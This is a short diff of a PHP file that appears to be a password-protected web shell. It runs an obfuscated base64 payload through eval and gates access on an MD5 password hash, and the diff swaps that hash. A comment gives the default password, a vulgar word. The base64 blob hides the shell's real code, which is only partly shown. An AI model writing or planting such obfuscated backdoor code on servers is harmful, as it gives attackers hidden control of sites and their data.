@@ -6,7 +6,7 @@ $source_bypass ='ZnVuY3Rpb24gc2VjdXJlUGF0aCgkcGF0aCkgewogICAgJHJlYWxQYXRoID0gcmV
    eval(base64_decode($source_bypass));
 if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
-       $hashed_password = 'd489a3289ecdc847cb67f7a480e6f9fa'; // Default Pw : kontol
+       $hashed_password = '48f973929ee5e31b4749ffda956a38dd'; // Default Pw : kontol
 
        if (md5($entered_password) === $hashed_password) {
            $_SESSION['logged_in'] = true;
